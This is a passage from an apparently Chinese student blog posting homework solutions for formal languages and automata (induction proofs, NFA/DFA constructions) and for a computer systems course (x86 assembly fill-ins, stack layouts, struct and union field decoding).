href="#Ex-2-2-9" class="headerlink" title="Ex 2.2.9"></a>Ex 2.2.9</h3><p>​    $(a)$</p><p>​    对任意输入串 $w\ne\varepsilon$, 我们证明 $\hat\delta(q_0, w) = \hat\delta(q_f, w)$.</p><p>​    对 $\vert w\vert$ 进行归纳:</p><p>​    \textbf{<strong>基础:</strong>} 如果 $\vert w\vert = 1$,</p><p>​    那么由 $w\in\Sigma$, 结合已知得</p><p>​    $$\hat\delta(q_0, w) = \hat\delta(q_f, w),$$</p><p>​    至此基础得证.</p><p>​    \textbf{<strong>归纳:</strong>} 现设 $\vert w\vert = n\thinspace(n\ge 2)$, 且对任何串 $w_0\thinspace(\vert w_0\vert &lt; n)$ 上述命题为真.</p><p>​    也就是说, 如果$\vert w_0\vert \le n - 1$, 那么$\hat\delta(q_0, w_0) = \hat\delta(q_f, w_0)$.</p><p>​    设 $w = w_0a$, 其中 $a$ 为串 $w$ 的最后一个元素.</p><p>​    那么结合 $\hat\delta$ 的定义得:</p><p>​    \begin{equation*}</p><p>​        \begin{aligned}</p><p>​            \hat\delta(q_0, w) &amp;= \hat\delta(q_0, w_0a) \</p><p>​            &amp;= \delta(\hat\delta(q_0, w_0), a) \</p><p>​            &amp;= \delta(\hat\delta(q_f, w_0), a) \</p><p>​            &amp;= \hat\delta(q_f, w_0a).</p><p>​        \end{aligned}</p><p>​    \end{equation*}</p><p>​    至此归纳得证.</p><p>​    $(b)$</p><p>​    已知 $\hat\delta(q_0, x) = q_f$. 对任意 $k &gt; 0$, 我们证明 $\hat\delta(q_0, x^k) = q_f$.</p><p>​    对 $k$ 进行归纳:</p><p>​    \textbf{<strong>基础:</strong>} 如果 $k = 1$, 那么由已知得</p><p>​    $$\hat\delta(q_0, x^k) = \hat\delta(q_0, x) = q_f,$$</p><p>​    至此基础得证.</p><p>​    \textbf{<strong>归纳:</strong>} 考虑 $k\ge 2$, 现设对任何 $k_0 &lt; k$ 上述命题为真,</p><p>​    也就是说, 如果$k_0\le k - 1$, 那么$\hat\delta(q_0, x^{k_0}) = q_f$.</p><p>​    由 $Ex 2.2.2$ 已证结论得:</p><p>​    \begin{equation*}</p><p>​        \begin{aligned}</p><p>​            \hat\delta(q_0, x^k) &amp;= \hat\delta(q_0, x^{k - 1}x) \</p><p>​            &amp;= \hat\delta(\hat\delta(q_0, x^{k - 1}), x) \</p><p>​            &amp;= \hat\delta(q_f, x) \</p><p>​            &amp;= \hat\delta(q_0, x) \</p><p>​            &amp;= q_f.</p><p>​        \end{aligned}</p><p>​    \end{equation*}</p><p>​    至此归纳得证.</p><h3 id="Ex-2-3-2"><a href="#Ex-2-3-2" class="headerlink" title="Ex 2.3.2"></a>Ex 2.3.2</h3><p>​    一个接受该 $NFA$ 的 $DFA$ 的转移表为:</p><p>   <img src="/pic/17.png"></p><h3 id="Ex-2-3-4-b"><a href="#Ex-2-3-4-b" class="headerlink" title="Ex 2.3.4 (b)"></a>Ex 2.3.4 (b)</h3><p>​    一个接受该语言的 $NFA$ 为:<br>​    $$A = (Q, \Sigma, \delta, q, F).$$</p><p>​    其中<br>​    $$Q = \left{q_s, q_0, q_1, \cdots, q_9, q_f\right},$$<br>​    $$\Sigma = \left{0, 1,\cdots ,9\right},$$<br>​    $$q = q_s,$$<br>​    $$F = \left{q_f\right}$$</p><p>​    并且<br>​    $$\delta(q_s,a) = \left{q_k\mid k\ne a\right}\cup\left{q_f\right},$$<br>​    $$\delta(q_k,a) = \left{q_k\right}, \mbox{当} k\ne a ;$$<br>​    $$\delta(q_k,a) = \left{q_f\right}, \mbox{当}k = a.$$</p><p>​    其中 $k = 0, 1, \cdots, 9.$    </p><h3 id="Ex-2-3-4-c"><a href="#Ex-2-3-4-c" class="headerlink" title="Ex 2.3.4 (c)"></a>Ex 2.3.4 (c)</h3><p>​    一个接受该语言的 $NFA$ 的转移表为:</p><p>   <img src="/pic/18.png"></p><h3 id="Ex-2-4-2-c"><a href="#Ex-2-4-2-c" class="headerlink" title="Ex 2.4.2 (c)"></a>Ex 2.4.2 (c)</h3><p>​    一个满足题意的 $NFA$ 为:</p><p>   <img src="/pic/19.png"></p><p>​    将其转化为满足题意的 $DFA$:</p><p>   <img src="/pic/20.png"> </p><p>​    此即转化后的结果.</p><h3 id="Ex-2-5-2"><a href="#Ex-2-5-2" class="headerlink" title="Ex 2.5.2"></a>Ex 2.5.2</h3><p>​    $(1)$ 计算可得</p><p>​    $ECLOSE(p) = \left{p, q, r\right}$, $ECLOSE(q) = \left{q\right}$, $ECLOSE(r) = \left{r\right}$.</p><p>​    $(2)$ 这个自动机接受的长度小于等于 $3$ 的串有:<br>​    $$\varepsilon, a, b, c, aa, ab, ac, ba, bb, bc, ca, cb, cc, aaa, aab, aac,$$<br>​    $$aba, abb, abc, aca, acb, acc, baa, bab, bac, bca, bcb, bcc,$$<br>​    $$caa, cab, cac, cba, cbb, cbc, cca, ccb, ccc.$$</p><p>​    $(3)$ 一个接受该 $\varepsilon-NFA$ 的 $DFA$ 的转移表为:</p><p>​     <img src="/pic/21.png"> </p><h3 id="Ex-2-5-3-a"><a href="#Ex-2-5-3-a" class="headerlink" title="Ex 2.5.3 (a)"></a>Ex 2.5.3 (a)</h3><p>​    一个接受该 $NFA$ 的转移表为:</p><p>​         <img src="/pic/22.png"> </p><h3 id="Ex-2-5-3-b"><a href="#Ex-2-5-3-b" class="headerlink" title="Ex 2.5.3 (b)"></a>Ex 2.5.3 (b)</h3><p>​    一个接受该 $NFA$ 的转移表为:</p><p>​         <img src="/pic/23.png"> </p><h3 id="Ex-2-5-3-c"><a href="#Ex-2-5-3-c" class="headerlink" title="Ex 2.5.3 (c)"></a>Ex 2.5.3 (c)</h3><p>​    一个接受该 $NFA$ 的转移表为:</p><p>​        <img src="/pic/24.png"> </p><h3 id="Ex-4-4-2-c"><a href="#Ex-4-4-2-c" class="headerlink" title="Ex 4.4.2 (c)"></a>Ex 4.4.2 (c)</h3><p>​    这个自动机的可区分性表为:</p><p>​        <img src="/pic/25.png"> </p><p>​    其最小状态的等价 $DFA$ 的转移表为:</p><p>​        <img src="/pic/26.png"> </p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> FL&amp;A </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FL&amp;A </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机系统概论 作业3</title>
      <link href="/20/"/>
      <url>/20/</url>
      
        <content type="html"><![CDATA[<h1 id="HW-3"><a href="#HW-3" class="headerlink" title="HW 3"></a>HW 3</h1><ol><li><p>编程解决猴子吃桃问题: 每天吃一半再多吃一个, 第十天想吃时候只剩一个,  问总共有多少. 该程序的 $C$ 语言程序如下, 请在其对应汇编代码 ($Linux X86- 64$) 内填入缺失内容.</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">eat_peaches</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token function">eat_peaches</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">eat_peaches:    cmpl $10, __①__    je   __②__    subq $8, %rsp    addl $1, %edi    call eat_peaches    leal 2(%rax, __③__), %eax    jmp  __④__.L3:movl $1, %eax __⑤__ .L2:    addq __⑥__, %rsp    ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c">①<span class="token operator">:</span> <span class="token operator">%</span>edi②<span class="token operator">:</span> <span class="token punctuation">.</span>L3③<span class="token operator">:</span> <span class="token operator">%</span>rax④<span class="token operator">:</span> <span class="token punctuation">.</span>L2⑤<span class="token operator">:</span> ret⑥<span class="token operator">:</span> $<span class="token number">8</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>有下列 $C$ 代码以及对应的汇编代码 ($Linux X86-64$), 请填充下表, 即给出各个变量或者寄存器在栈中的存储位置 (以相对于栈帧基址寄存器 <code>%rbp​</code> 的十进制偏移量形式给出, 可正可负); 如果无法以 “在栈中的存储位置” 形式给出, 请说明理由.</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xF0F1F2F3</span><span class="token punctuation">;</span>a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">;</span><span class="token function">gets</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"a[0] = 0x%x, a[1] = 0x%x, buf = %s\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.LC0:.string "a[0] = 0x%x, a[1] = 0x%x, buf = %s\n"foo:    pushq %rbp    movq  %rsp, %rbp    pushq %rbx    subq  $24, %rsp    movl  %edi, %ebx    leaq  -32(%rbp), %rdi    movl  $0, %eax    call  gets    leaq  -32(%rbp), %rcx    movl  %ebx, %edx    movl  $-252579085, %esi    movl  $.LC0, %edi    movl  $0, %eax    call  printf    addq  $24, %rsp    popq  %rbx    popq  %rbp    ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre> <center><table><thead><tr><th align="center">变量</th><th align="center">十进制形式的 $offset$ (或者说明)</th></tr></thead><tbody><tr><td align="center"><code>a</code></td><td align="center">经过优化, 未在栈帧中存储</td></tr><tr><td align="center"><code>a[2]</code></td><td align="center">经过优化, 未在栈帧中存储</td></tr><tr><td align="center"><code>x</code></td><td align="center">存储在 <code>%rbx</code> 中, 未在栈帧中存储</td></tr><tr><td align="center"><code>buf</code></td><td align="center">$-32$</td></tr><tr><td align="center"><code>buf[3]</code></td><td align="center">$-29$</td></tr><tr><td align="center"><code>%rbx</code> 的保存值</td><td align="center">$-8$</td></tr></tbody></table> </center></li><li><p>过程调用以及返回的顺序在一般情况下都是 “过程返回的顺序恰好与调用顺序相反”, 但是我们可以利用汇编以及对运行栈的理解来编写汇编过程打破这一惯例.</p><p>有如下汇编代码 ( $x86-32$ 架构 ), 其中 <code>GET</code> 过程唯一的输入参数是一个用于存储当前处理器以及栈信息的内存块地址 (假设该内存块的空间足够大), 而 <code>SET</code> 过程则用于恢复被 <code>GET</code> 过程所保存的处理器及栈信息, 其唯一的输入参数也是该内存块地址. 在理解代码的基础上, 回答下列问题:</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">GET:    movl 4(%esp), %eax     #(A)    …    movl %edi, 20(%eax)    movl %esi, 24(%eax)    movl %ebp, 28(%eax)    movl %ebx, 36(%eax)    movl %edx, 40(%eax)    movl %ecx, 44(%eax)    movl $1, 48(%eax)     movl (%esp), %ecx      #(B)    movl %ecx, 60(%eax)    leal 4(%esp), %ecx     #(C)    movl %ecx, 72(%eax)    movl 44(%eax), %ecx    movl $0, %eax    retSET:    movl 4(%esp), %eax    …    movl 20(%eax), %edi    movl 24(%eax), %esi    movl 28(%eax), %ebp    movl 36(%eax), %ebx    movl 40(%eax), %edx    movl 44(%eax), %ecx    movl ____ (%eax), %esp #(D)    pushl 60(%eax)         #(E)    movl 48(%eax), %eax    ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>(1) <code>SET​</code> 过程的返回地址是什么, 其返回值是多少? </p><p><strong>解答:</strong></p><p>返回地址为 <code>GET</code> 函数的下一条地址; 返回值为 $1$.</p><p>(2) 代码段中的 $(A)$ 指令执行后，<code>eax</code> 中存放的是什么? $(B)$ 指令执行后, <code>ecx</code> 中存放的是什么? $(C)$ 指令的作用是什么? $(E)$ 指令的作用是什么? 并将 $(D)$ 指令补充完整.</p><p><strong>解答:</strong></p><p>$(A)$ 指令执行后, <code>eax​</code> 中存放的是用于存储处理器与栈信息的内存块的地址, 即 <code>GET</code> 函数的输入参数;</p><p>$(B)$ 指令执行后, <code>ecx​</code> 中存放的是 <code>GET</code> 函数的返回地址;</p><p>$(C)$ 指令的作用是临时存储 <code>4(%rsp)</code> 的内容, 并中转至目标内存中;</p><p>$(E)$ 指令的作用是将之前记录的 <code>GET</code> 函数的返回地址压入栈, <code>ret</code> 指令跳转到之前的相应地址;</p><p>$(D)$ 指令需填入 $72$.</p></li><li><p>请分别对照下列的 $C$ 代码与对应的汇编代码, 解释下 $C$ 函数是如何传入 <code>struct​</code> 类型参数的, 可以通过画出 <code>call input_struct</code> 时栈的 $layout$, 并辅以说明来解释.</p><ol><li><code>gcc –Og ...​</code></li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">{</span><span class="token keyword">int</span> age<span class="token punctuation">;</span> <span class="token keyword">int</span> bye<span class="token punctuation">;</span> <span class="token keyword">int</span> coo<span class="token punctuation">;</span> <span class="token keyword">int</span> ddd<span class="token punctuation">;</span> <span class="token keyword">int</span> eee<span class="token punctuation">;</span><span class="token punctuation">}</span> TEST_Struct<span class="token punctuation">;</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">input_struct</span><span class="token punctuation">(</span>TEST_Struct in_struct<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> in_struct<span class="token punctuation">.</span>eee <span class="token operator">+</span> in_struct<span class="token punctuation">.</span>age <span class="token operator">*</span> <span class="token number">2</span> <span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">function2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>TEST_Struct main_struct<span class="token punctuation">;</span>main_struct<span class="token punctuation">.</span>age <span class="token operator">=</span> i<span class="token punctuation">;</span>main_struct<span class="token punctuation">.</span>bye <span class="token operator">=</span> i<span class="token punctuation">;</span>main_struct<span class="token punctuation">.</span>coo <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> i<span class="token punctuation">;</span>main_struct<span class="token punctuation">.</span>ddd <span class="token operator">=</span> i<span class="token punctuation">;</span>main_struct<span class="token punctuation">.</span>eee <span class="token operator">=</span> i<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">input_struct</span><span class="token punctuation">(</span>main_struct<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">input_struct:    movl 8(%rsp), %eax    #age    addl %eax, %eax    addl 24(%rsp), %eax   #eee    retfunction2:    subq $56, %rsp    movl i(%rip), %eax    movl %eax, 24(%rsp)   #age    movl %eax, 28(%rsp)   #bye    leal (%rax,%rax), %edx    movl %edx, 32(%rsp)   #coo    movl %eax, 36(%rsp)   #ddd    movq 24(%rsp), %rdx    movq %rdx, (%rsp)     #age/bye    movq 32(%rsp), %rdx    movq %rdx, 8(%rsp)    #coo/ddd     movl %eax, 16(%rsp)   #eee    call input_struct    addq $56, %rsp    ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>解答：</strong></p><p>在栈帧中存储结构体实例. 在发生调用 <code>call input_struct​</code> 前, 在 <code>24(%rsp)</code> 开始由低地址向高地址存储 <code>age</code>, <code>bye</code>, <code>coo</code>, <code>ddd</code>. 随后将这些信息转移到 <code>%rsp</code> 开始的低地址内存中, 并附加 <code>eee</code>.</p><div align="center"><img src="/pic/9.png" width="20%" height="20%"></div><p>调用 <code>call input_struct</code> 后, 返回地址被压入栈中, 此时通过 <code>8(%rsp)</code> 访问的即是 <code>in_struct.age</code>, 通过 <code>24(%rsp)</code> 访问的即是 <code>in_struct.eee</code>.</p><div align="center"><img src="/pic/10.png" width="20%" height="20%"></div><ol start="2"><li>$C$ 代码不变, 通过 <code>gcc -O1/2 ...</code> 编译后的汇编如下:</li></ol><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">input_struct:    movl 24(%rsp), %eax    movl 8(%rsp), %edx    leal (%rax,%rdx,2), %eax    retfunction2:    movl i(%rip), %eax    leal (%rax,%rax,2), %eax    ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>请分析针对这段代码, 编译器做了什么优化工作.</p><p><strong>解答:</strong></p><p>使用一步 <code>leal</code> 指令替代原本的两步 <code>addl</code> 指令;</p><p>直接使用全局变量 <code>i</code> 代替已知相等的 <code>in_struct.age</code>、 <code>in_struct.age</code> 进行计算.</p><ol start="3"><li>如果在上面的 $C$ 代码的 <code>int​ input_struct</code> 声明前加上 ​<code>static</code>, 经 <code>gcc –O1/2 ...</code> 编译后的代码如下:</li></ol><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">function2:    movl i(%rip), %eax    leal (%rax,%rax,2), %eax    ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>请分析针对这段代码, 编译器做了什么优化工作.</p><p><strong>解答:</strong></p><p>将 <code>int input_struct</code> 声明为 <code>static</code> 后只会被当前编译单元被调用, 优化 <code>function2</code> 后无需调用 <code>input_struct</code>, 因此可以不进行编译.</p></li><li><p>有如下三类结构、联合定义, 请根据左侧的汇编语言 $(x86-32)$, 补齐右侧的 $C$ 语言.</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">s1</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> a<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">union</span> u1 b<span class="token punctuation">;</span>    <span class="token keyword">int</span> c<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">s2</span> <span class="token punctuation">{</span>    <span class="token keyword">struct</span> <span class="token class-name">s1</span> <span class="token operator">*</span>d<span class="token punctuation">;</span>    <span class="token keyword">char</span> e<span class="token punctuation">;</span>    <span class="token keyword">int</span> f<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">s2</span> <span class="token operator">*</span>g<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">union</span> u1 <span class="token punctuation">{</span>    <span class="token keyword">struct</span> <span class="token class-name">s1</span> <span class="token operator">*</span>h<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">s2</span> <span class="token operator">*</span>i<span class="token punctuation">;</span>    <span class="token keyword">char</span> j<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">A.proc1:pushl %ebpmovl %esp, %ebpmovl 8(%ebp), %eaxmovl 12(%eax), %eaxmovl %ebp, %esppopl %ebpret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">proc1</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">s2</span> <span class="token operator">*</span>x<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> x<span class="token operator">-&gt;</span> __________<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">B.proc2:pushl %ebpmovl %esp, %ebpmovl 8(%ebp), %eaxmovl 4(%eax), %eaxmovl 20(%eax), %eaxmovl %ebp, %esppopl %ebpret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">proc2</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">s1</span> <span class="token operator">*</span>x<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> x<span class="token operator">-&gt;</span> __________<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">C.proc3:pushl %ebpmovl %esp, %ebpmovl 8(%ebp), %eaxmovl (%eax), %eaxmovsbl 4(%eax), %eaxmovl %ebp, %esppopl %ebpret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> <span class="token function">proc3</span><span class="token punctuation">(</span><span class="token keyword">union</span> u1 <span class="token operator">*</span>x<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> x<span class="token operator">-&gt;</span> __________<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">D.proc4:pushl %ebpmovl %esp, %ebpmovl 8(%ebp), %eaxmovl (%eax), %eaxmovl 24(%eax), %eaxmovl (%eax), %eaxmovsbl 1(%eax), %eaxmovl %ebp, %esppopl %ebpret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> <span class="token function">proc4</span><span class="token punctuation">(</span><span class="token keyword">union</span> u1 <span class="token operator">*</span>x<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> x<span class="token operator">-&gt;</span> __________<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c">A<span class="token operator">:</span> f<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> B<span class="token operator">:</span> b<span class="token punctuation">.</span>i<span class="token operator">-&gt;</span>f<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>C<span class="token operator">:</span> i<span class="token operator">-&gt;</span>eD<span class="token operator">:</span> i<span class="token operator">-&gt;</span>g<span class="token operator">-&gt;</span>d<span class="token operator">-&gt;</span>a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>已知以下 $C++$ 代码与对应的运行结果, 对源代码进行补全并绘制 <code>struct A​</code> 各变量在内存中的存放位置.</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cstdint&gt;</span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">A</span> <span class="token punctuation">{</span>T1 a<span class="token punctuation">;</span>T2 b<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">B</span> <span class="token punctuation">{</span>T3 c<span class="token punctuation">;</span>T4 d<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>B e<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    A s<span class="token punctuation">;</span>    <span class="token class-name">size_t</span> size_A <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>    std<span class="token operator">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"size of A:"</span> <span class="token operator">&lt;&lt;</span> size_A <span class="token operator">&lt;&lt;</span> std<span class="token operator">::</span>endl<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span> p <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>s<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> size_A<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> p<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xaa</span><span class="token punctuation">;</span>    std<span class="token operator">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"a: "</span> <span class="token operator">&lt;&lt;</span> s<span class="token punctuation">.</span>a <span class="token operator">&lt;&lt;</span> std<span class="token operator">::</span>endl<span class="token punctuation">;</span>    std<span class="token operator">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"b: "</span> <span class="token operator">&lt;&lt;</span> s<span class="token punctuation">.</span>b <span class="token operator">&lt;&lt;</span> std<span class="token operator">::</span>endl<span class="token punctuation">;</span>    std<span class="token operator">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"e[0].c: "</span> <span class="token operator">&lt;&lt;</span> s<span class="token punctuation">.</span>e<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>c <span class="token operator">&lt;&lt;</span> std<span class="token operator">::</span>endl<span class="token punctuation">;</span>    std<span class="token operator">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"e[0].d: "</span> <span class="token operator">&lt;&lt;</span> s<span class="token punctuation">.</span>e<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>d <span class="token operator">&lt;&lt;</span> std<span class="token operator">::</span>endl<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">size of A<span class="token operator">:</span> <span class="token number">96</span>a<span class="token operator">:</span> <span class="token operator">-</span><span class="token number">21846</span>b<span class="token operator">:</span> <span class="token number">12297829382473034410</span>e<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>c<span class="token operator">:</span> <span class="token operator">-</span><span class="token number">1431655766</span>e<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>d<span class="token operator">:</span> <span 